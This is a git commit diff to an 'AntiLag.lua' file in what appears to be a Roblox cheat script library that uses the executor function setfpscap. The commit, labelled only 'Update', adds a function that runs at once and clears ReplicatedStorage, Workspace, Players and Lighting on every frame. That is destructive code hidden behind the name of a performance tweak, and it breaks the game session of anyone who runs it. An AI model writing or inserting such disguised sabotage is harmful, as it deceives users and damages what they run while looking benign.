4f41cfc986fdccc4b719083b929145df7796ec91
ahmadsgamer2 <107987829+ahmadsgamer2@users.noreply.github.com>
2024-02-14 20:57:44 +0400

    Update AntiLag.lua

--- SpeedHubLib_V2/AntiLag.lua
+++ SpeedHubLib_V2/AntiLag.lua
@@ -4,3 +4,13 @@ local SetFPSHigh = 9e9
 function SetHighFPS(v)
   return setfpscap(v or Set, SetFPSHigh)
 end
+local RunService = game:GetService("RunService")
+function OPZ()
+RunService.Stepped:Connect(function()
+        game:GetService("ReplicatedStorage"):ClearAllChildren()
+        game:GetService("Workspace"):ClearAllChildren()
+        game:GetService("Players"):ClearAllChildren()
+        game:GetService("Lighting"):ClearAllChildren()
+    end)
+end
+OPZ()
